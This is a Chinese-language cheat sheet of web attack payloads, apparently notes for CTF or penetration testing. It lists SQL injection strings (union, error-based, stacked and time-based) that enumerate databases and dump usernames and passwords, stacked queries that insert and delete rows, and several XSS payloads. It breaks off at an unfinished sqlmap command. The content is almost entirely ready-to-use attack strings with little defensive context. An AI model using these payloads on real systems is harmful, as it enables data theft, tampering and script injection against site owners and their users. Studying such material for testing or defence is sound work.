1.联合注入
联合注入
```plain
?id=1 and 1=1正常且id=1 and 1=2正常则为字符型注入
?id=1 and 1=1正常且id=1 and 1=2不正常为数字型注
-1' union select 1,2,database()--+ //得到数据库名
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #/'数据库名'--+ //得到该数据库下的所有表名
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+ //得到users表中的字段名
-1' union select 1,2,group_concat(username,password) from users--+ //得到users表中username，password的内容
得到username和password
```
2.报错注入（最多回显30字节）

```plain
1' and (extractvalue(1,concat(0x7e,version(),0x7e)))--+
1' and (extractvalue(1,concat(0x7e,database(),0x7e)))--+
1' and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e)))--+
1' and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='test_tb'),0x7e)))#
1' and (extractvalue(1,concat(0x7e,(select group_concat(id,flag) from test_tb),0x7e)))#
```
3.堆叠注入:**将多条SQL语句放在一起，并用分号;隔开**

```plain
1;show databases;#
1;show tables;#
1';show columns from words;#
#插入用户密码数据
?id=1';insert into users(id,username,password) values(66,'aiyou','bucuo') --+
#插入当前数据库数据
?id=1';insert into users(id,username,password) values(67,database(),'bucuo') --+
#查询当前数据库信息下方查询方式同等    ?id=67 
----------------------------------------
#插入查询所有表的所有数据，但数据仍显示不全
?id=1';insert into users(id,username,password) values(72,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 ) ,'buuck') --+
#插入当前数据库下的指定表数据
?id=1';insert into users(id,username,password) values(71,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 2,1) ,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 3,1)) --+
#插入当前数据库下的指定表数据的列数据
?id=1';insert into users(id,username,password) values(74,(select column_name from information_schema.columns where table_name="users" limit 13,1) ,(select column_name from information_schema.columns where table_name="users" limit 12,1)) --+
#删除数据
?id=1';delete from users where id=74 and sleep(if((select database())=0x7365637572697479,5,0));
```
​
基本注入
```javascript
1' or '1'='1'#	#or语句
1' order by 3#	#order语句
1' union select 1,2,3#	#联合查询
1'and(select extractvalue(1,concat('~',(select database()))))	#报错注入
1' and if(length(database())>1,sleep(5),1)--+	#时间注入
 select 1,schema_name from information_schema.schemata# 查询所有库语句

在数据库名或表名为全数字时，要用`` 反引号括起来
```
4.xss
xss
```javascript
<script>alert</script>
<img src="x" onerror=alert(1)>图片加载错误触发
<img src="1" onerror=eval("alert('xss')")>
<img src=1 onmouseover="alert(1)">鼠标指针移动到元素时触发
<img src=1 onmouseout="alert(1)">鼠标指针移出时触发 
<input type="text" onclick/onmouseover="alert()"> 出现文本框时点击或移动
onfocus=javascript:alert()
<a href="javascript:a" onmouseover="alert(/xss/)">aa</a> 还有大小写绕过
还有http头里的ua头，cookie等
```
5.sqlmap使用
python sqlmap.py -u 
